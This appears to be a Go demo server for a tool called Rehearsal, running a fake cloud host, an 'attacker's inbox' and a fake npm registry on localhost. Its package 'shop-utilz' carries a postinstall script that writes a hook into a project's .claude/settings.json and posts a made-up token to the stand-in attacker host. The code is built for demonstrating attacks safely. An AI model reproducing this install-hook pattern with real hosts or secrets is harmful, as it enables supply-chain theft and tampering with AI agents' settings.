// Command demo-server is three small stand-in services for demonstrating
// Rehearsal, each on its own port of this machine and nowhere else:
//
//   - a "cloud host" with a production database that can be deleted
//   - an "inbox" that shows whatever is sent to it
//   - a package registry serving one package, whose install script writes
//     a hook into the sample project's agent settings and posts a made-up
//     token to the inbox
//
// Nothing here is harmful and nothing leaves this machine. The package's
// script only writes one file in the sample project and posts a fixed,
// fake string to the inbox.
package main

import (
	"archive/tar"
	"bytes"
	"compress/gzip"
	"crypto/sha512"
	"encoding/base64"
	"encoding/json"
	"errors"
	"flag"
	"fmt"
	"html"
	"io"
	"net"
	"net/http"
	"os"
	"os/signal"
	"slices"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"
)

const (
	packageName    = "shop-utilz"
	packageVersion = "1.0.0"
	// the most the inbox keeps
	maxInbox = 50
	maxBody  = 64 << 10
)

// cloud is the stand-in hosting service.
type cloud struct {
	mu        sync.Mutex
	databases []string
}

func newCloud() *cloud { return &cloud{databases: []string{"production", "staging"}} }

func (c *cloud) handler() http.Handler {
	mux := http.NewServeMux()
	mux.HandleFunc("GET /v1/databases", func(w http.ResponseWriter, _ *http.Request) {
		c.mu.Lock()
		defer c.mu.Unlock()
		writeJSON(w, map[string][]string{"databases": c.databases})
	})
	mux.HandleFunc("DELETE /v1/databases/{name}", func(w http.ResponseWriter, r *http.Request) {
		c.mu.Lock()
		defer c.mu.Unlock()
		i := slices.Index(c.databases, r.PathValue("name"))
		if i < 0 {
			http.Error(w, "no such database", http.StatusNotFound)
			return
		}
		c.databases = slices.Delete(c.databases, i, i+1)
		writeJSON(w, map[string]string{"deleted": r.PathValue("name")})
	})
	mux.HandleFunc("GET /{$}", func(w http.ResponseWriter, _ *http.Request) {
		c.mu.Lock()
		defer c.mu.Unlock()
		state := "DELETED"
		if slices.Contains(c.databases, "production") {
			state = "present"
		}
		page(w, "Demo cloud host", fmt.Sprintf("<p>Production database: <strong>%s</strong></p><p>Databases: %s</p>",
			state, html.EscapeString(strings.Join(c.databases, ", "))))
	})
	return mux
}

// inbox is the attacker's collecting point. It shows whatever is sent to
// /collect or /pixel, by any method. Anything else a browser asks for on
// its own (the front page, an icon) is not counted.
type inbox struct {
	mu    sync.Mutex
	items []string
}

func (b *inbox) handler() http.Handler {
	mux := http.NewServeMux()
	mux.HandleFunc("GET /{$}", func(w http.ResponseWriter, _ *http.Request) {
		b.mu.Lock()
		defer b.mu.Unlock()
		var body strings.Builder
		if len(b.items) == 0 {
			body.WriteString("<p>Nothing has arrived.</p>")
		}
		for _, item := range b.items {
			fmt.Fprintf(&body, "<pre>%s</pre>", html.EscapeString(item))
		}
		page(w, fmt.Sprintf("Attacker's inbox: %d received", len(b.items)), body.String())
	})
	mux.HandleFunc("/collect", b.collect)
	mux.HandleFunc("/pixel", b.collect)
	return mux
}

func (b *inbox) collect(w http.ResponseWriter, r *http.Request) {
	data, err := io.ReadAll(io.LimitReader(r.Body, maxBody))
	if err != nil {
		http.Error(w, "unreadable", http.StatusBadRequest)
		return
	}
	b.mu.Lock()
	defer b.mu.Unlock()
	if len(b.items) < maxInbox {
		b.items = append(b.items, fmt.Sprintf("%s %s\n%s", r.Method, r.URL.RequestURI(), data))
	}
	w.WriteHeader(http.StatusCreated)
}

func (b *inbox) received() []string {
	b.mu.Lock()
	defer b.mu.Unlock()
	return slices.Clone(b.items)
}

// registry serves the one demo package the way an npm registry would.
type registry struct {
	self      string // this registry's address, for the tarball link
	inbox     string // where the install script posts
	published time.Time
	tarball   []byte
}

// setupScript is what the package runs when installed. It is the whole
// "payload": one harmless hook written into the project it is installed
// in, and a fixed made-up token posted to the local inbox.
const setupScript = `// Part of the Rehearsal demo. This is what a hostile install script
// might do, with nothing hostile in it.
const fs = require('fs')
const path = require('path')
const http = require('http')

const project = process.env.INIT_CWD || process.cwd()
const settings = path.join(project, '.claude', 'settings.json')
fs.mkdirSync(path.dirname(settings), { recursive: true })
fs.writeFileSync(settings, JSON.stringify({
  hooks: { PreToolUse: [{ hooks: [{ type: 'command', command: 'echo rehearsal-demo-hook' }] }] },
}, null, 2) + '\n')

const req = http.request(%q, { method: 'POST' })
req.on('error', () => {})
req.end('token=demo-fake-token-not-a-credential')
`

func newRegistry(self, inboxAddress string, now time.Time) (*registry, error) {
	r := &registry{self: self, inbox: inboxAddress, published: now.Add(-9 * time.Hour)}
	manifest, err := json.MarshalIndent(map[string]any{
		"name": packageName, "version": packageVersion, "main": "index.js",
		"description": "Rehearsal demo package. Harmless.",
		"scripts":     map[string]string{"postinstall": "node setup.js"},
	}, "", "  ")
	if err != nil {
		return nil, err
	}
	files := []struct{ name, content string }{
		{"package/package.json", string(manifest) + "\n"},
		{"package/index.js", "module.exports = { round: (n) => Math.round(n * 100) / 100 }\n"},
		{"package/setup.js", fmt.Sprintf(setupScript, inboxAddress+"/collect")},
	}
	var buf bytes.Buffer
	gz := gzip.NewWriter(&buf)
	tw := tar.NewWriter(gz)
	for _, f := range files {
		if err := tw.WriteHeader(&tar.Header{Name: f.name, Mode: 0o644, Size: int64(len(f.content)), ModTime: r.published}); err != nil {
			return nil, err
		}
		if _, err := tw.Write([]byte(f.content)); err != nil {
			return nil, err
		}
	}
	if err := errors.Join(tw.Close(), gz.Close()); err != nil {
		return nil, err
	}
	r.tarball = buf.Bytes()
	return r, nil
}

func (r *registry) handler() http.Handler {
	file := fmt.Sprintf("%s-%s.tgz", packageName, packageVersion)
	mux := http.NewServeMux()
	mux.HandleFunc("GET /"+packageName, func(w http.ResponseWriter, _ *http.Request) {
		sum := sha512.Sum512(r.tarball)
		stamp := r.published.UTC().Format(time.RFC3339)
		writeJSON(w, map[string]any{
			"name":      packageName,
			"dist-tags": map[string]string{"latest": packageVersion},
			"time":      map[string]string{"created": stamp, "modified": stamp, packageVersion: stamp},
			"versions": map[string]any{packageVersion: map[string]any{
				"name": packageName, "version": packageVersion, "main": "index.js",
				"scripts":          map[string]string{"postinstall": "node setup.js"},
				"hasInstallScript": true,
				"dist": map[string]string{
					"tarball":   r.self + "/" + packageName + "/-/" + file,
					"integrity": "sha512-" + base64.StdEncoding.EncodeToString(sum[:]),
				},
			}},
		})
	})
	mux.HandleFunc("GET /"+packageName+"/-/"+file, func(w http.ResponseWriter, _ *http.Request) {
		w.Header().Set("Content-Type", "application/octet-stream")
		_, _ = w.Write(r.tarball) // fails only when the client has gone away
	})
	return mux
}

func writeJSON(w http.ResponseWriter, v any) {
	w.Header().Set("Content-Type", "application/json")
	_ = json.NewEncoder(w).Encode(v) // fails only when the client has gone away
}

func page(w http.ResponseWriter, title, body string) {
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	fmt.Fprintf(w, "<!doctype html><meta charset=utf-8><meta http-equiv=refresh content=2><title>%[1]s</title>"+
		"<body style=\"font: 18px system-ui; max-width: 760px; padding: 48px 24px\"><h1>%[1]s</h1>%[2]s</body>", html.EscapeString(title), body)
}

// local is the only kind of address this program will listen on.
func local(port int) string {
	return net.JoinHostPort("127.0.0.1", strconv.Itoa(port))
}

// The names the three services go by. A name under .localhost means this
// machine (RFC 6761). Rehearsal, curl and browsers connect such a name to
// the loopback address themselves. Node asks the system, which on some
// machines doesn't know, and start.sh says so when that is the case.
var names = []string{"cloud.localhost", "attacker-inbox.localhost", "registry.localhost"}

func main() {
	base := flag.Int("port", 7911, "first of three ports: cloud host, inbox, registry")
	flag.Parse()
	if err := run(*base); err != nil {
		fmt.Fprintln(os.Stderr, "demo-server:", err)
		os.Exit(1)
	}
}

func run(base int) error {
	address := func(i int) string {
		return fmt.Sprintf("http://%s:%d", names[i], base+i)
	}
	in := &inbox{}
	reg, err := newRegistry(address(2), address(1), time.Now())
	if err != nil {
		return err
	}
	sites := []struct {
		name    string
		port    int
		handler http.Handler
	}{
		{"cloud host", base, newCloud().handler()},
		{"attacker's inbox", base + 1, in.handler()},
		{"package registry", base + 2, reg.handler()},
	}
	failed := make(chan error, len(sites))
	for i, s := range sites {
		l, err := net.Listen("tcp", local(s.port))
		if err != nil {
			return fmt.Errorf("listen for the %s: %w", s.name, err)
		}
		fmt.Printf("%-17s %s\n", s.name, address(i))
		srv := &http.Server{Handler: s.handler, ReadHeaderTimeout: 5 * time.Second}
		go func() { failed <- srv.Serve(l) }()
	}
	stop := make(chan os.Signal, 1)
	signal.Notify(stop, os.Interrupt, syscall.SIGTERM)
	select {
	case err := <-failed:
		return err
	case <-stop:
		return nil
	}
}
